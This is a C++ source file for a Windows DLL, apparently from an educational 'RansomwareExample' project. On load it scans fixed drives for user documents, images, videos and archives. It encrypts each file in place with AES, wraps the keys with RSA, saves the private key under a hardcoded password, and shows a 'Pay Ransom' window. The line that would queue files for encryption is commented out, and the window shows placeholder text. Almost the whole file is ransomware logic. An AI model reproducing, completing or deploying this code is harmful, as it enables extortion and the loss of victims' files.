// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#include <cstdlib>
#include <iostream>
#include <vector>
#include <set>
#include <tuple>
#include <fstream>
#include <iostream>

#include <windows.h>

#include <openssl\bio.h>
#include <openssl\pem.h>

#include "..\..\RansomwareExample\RansomwareExample\AESCrypto.h"
#include "..\..\RansomwareExample\RansomwareExample\RSACrypto.h"

#include <boost\filesystem.hpp>

using namespace std;
using namespace boost::filesystem;

vector<wstring>* get_available_drives();
set<wstring>* get_wanted_extentions();


LPWSTR g_szClassName = L"myWindowClass";

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		vector<wstring>* available_drives = get_available_drives();
		set<wstring>* wanted_extentions = get_wanted_extentions();

		printf("Gathering file paths\n");

		vector<wstring> file_paths = vector<wstring>();
		printf("Generating RSA key\n");
		RSACrypto rsa = RSACrypto();
		// Test
		// wstring drive = wstring(L"C:\\Users\\irslambouf\\Desktop\\test");
		for (wstring drive : *available_drives) {
			if (drive == L"C:\\") {
				drive += L"Users";
			}

			wprintf(L"Trying - %s\n", &drive[0]);
			recursive_directory_iterator dir(drive), end;

			set<wstring> unwanted_folders = set<wstring>();
			unwanted_folders.insert(L"Windows");
			unwanted_folders.insert(L"AppData");
			unwanted_folders.insert(L"Microsoft");

			while (dir != end) {
				try
				{
					if (is_directory(dir->path())) {
						// Exclude certain paths 
						for (wstring partial_folder_name : unwanted_folders) {
							if (dir->path().wstring().find(partial_folder_name) != wstring::npos) {
								wprintf(L"Ignoring folder %s\n", &(dir->path().wstring())[0]);
								// Don't iterate further into folder
								dir.no_push();
								break;
							}
						}
					}

					if (is_regular_file(dir->path())) {
						// Only gather files with particular extentions
						if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
							wprintf(L"\t-%s\n", &(dir->path().wstring())[0]);
							//file_paths.push_back(dir->path().wstring());
						}
					}

					++dir;
				}
				catch (const filesystem_error& ex)
				{
					printf("PROBLEM PATH - %s\n", dir->path());
					printf("%s\n", ex.what());
				}
			}

			printf("Generating AES key\n");
			AESCrypto aes = AESCrypto();

			wprintf(L"Gathered %d files for encryption\n", file_paths.size());
			for (wstring path_str : file_paths) {
				unsigned char * aes_key_and_tag = new unsigned char[32 + 16]();
				aes.get_aes_key(aes_key_and_tag);

				if (aes.in_place_encrypt(path_str, aes_key_and_tag + 32) > 0) { // Fill last 16 bytes with gcm tag
					wprintf(L"Successfully encrypted - %s\n", &(path_str)[0]);
				}
				else {
					wprintf(L"Failed encryption - %s\n", &(path_str)[0]);
				}

				wstring key_path = path_str + L".key";
				wprintf(L"Encrypting key for %s\n", &path_str[0]);
				rsa.encrypt_key(key_path, aes_key_and_tag, 32 + 16);
			}
		}

		printf("Saving RSA key\n");
		/* Save encrypted RSA private key */
		BIO *out = BIO_new_file("C:\\Users\\Public\\priv.key", "w");
		EVP_PKEY *priv_key = EVP_PKEY_new();
		EVP_PKEY_set1_RSA(priv_key, rsa.get_rsa());
		if (!PEM_write_bio_PKCS8PrivateKey(out, priv_key, EVP_aes_256_cbc(), NULL, NULL, NULL, "SuP3RS3Cr3tPa$$w0Rd")) {
			printf("Failed to write private key, exiting...");
		}
		else {
			printf("Successfully encrypted RSA key... exiting");
		}
		/* Clean up memory */
		EVP_PKEY_free(priv_key);
		BIO_free_all(out);
		rsa.free_all();

		// Ransom window
		WNDCLASSEX wc;
		HWND hwnd;
		MSG Msg;

		//Step 1: Registering the Window Class
		wc.cbSize = sizeof(WNDCLASSEX);
		wc.style = 0;
		wc.lpfnWndProc = WndProc;
		wc.cbClsExtra = 0;
		wc.cbWndExtra = 0;
		wc.hInstance = hModule;
		wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
		wc.hCursor = LoadCursor(NULL, IDC_ARROW);
		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
		wc.lpszMenuName = NULL;
		wc.lpszClassName = g_szClassName;
		wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

		if (!RegisterClassEx(&wc))
		{
			MessageBox(NULL, L"Window Registration Failed!", L"Error!",
				MB_ICONEXCLAMATION | MB_OK);
			return 0;
		}

		// Step 2: Creating the Window
		hwnd = CreateWindowEx(
			WS_EX_CLIENTEDGE,
			g_szClassName,
			L"Pay Ransom for Drecryption of Files",
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
			NULL, NULL, hModule, NULL);

		if (hwnd == NULL)
		{
			MessageBox(NULL, L"Window Creation Failed!", L"Error!",
				MB_ICONEXCLAMATION | MB_OK);
			return 0;
		}

		ShowWindow(hwnd, 3);
		UpdateWindow(hwnd);

		// Step 3: The Message Loop
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
		return Msg.wParam;

	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

vector<wstring>* get_available_drives() {

	vector<wstring>* drives = new vector<wstring>();

	WCHAR myDrives[512];
	UINT driveType;

	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
	{
		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
	}
	else
	{
		wprintf(L"This machine has the following logical drives: \n");

		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
		{
			driveType = GetDriveTypeW(drive);
			wprintf(L"Drive %s is type %d \n", drive, driveType);
			// Only deal with local drives
			if (driveType == DRIVE_FIXED) {
				wstring drive_string(drive);
				drives->push_back(drive_string);
			}
		}
	}

	return drives;
}

set<wstring>* get_wanted_extentions() {
	set<wstring>* extentions = new set<wstring>();
	// Text
	extentions->insert(L".pdf");
	extentions->insert(L".doc");
	extentions->insert(L".docx");
	extentions->insert(L".txt");
	extentions->insert(L".xls");
	extentions->insert(L".csv");
	// Images 
	extentions->insert(L".jpg");
	extentions->insert(L".jpeg");
	extentions->insert(L".png");
	extentions->insert(L".gif");
	// Video
	extentions->insert(L".webm");
	extentions->insert(L".mkv");
	extentions->insert(L".avi");
	extentions->insert(L".flv");
	extentions->insert(L".mp4");
	extentions->insert(L".wmv");
	extentions->insert(L".mpg");
	extentions->insert(L".mpeg");
	// Compressed
	extentions->insert(L".tar");
	extentions->insert(L".gz");
	extentions->insert(L".zip");
	extentions->insert(L".7z");
	extentions->insert(L".rar");
	// Executables
	/*extentions->insert(L".exe");
	extentions->insert(L".msi");
	extentions->insert(L".bin");
	extentions->insert(L".iso");*/

	return extentions;
}

// Step 4: the Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	case WM_PAINT: {
		PAINTSTRUCT ps;
		HDC hDC = BeginPaint(hwnd, &ps);
		RECT rect;
		GetClientRect(hwnd, &rect);
		wstring text = L"Hello World!This is a hello world application made in the Win32 API This example was made by some random dude, aka -LeetGamer-";
		text += L"akjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjk";
		DrawText(hDC, &text[0], text.length(), &rect, DT_WORDBREAK);
		EndPaint(hwnd, &ps);
		break;
	}

	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}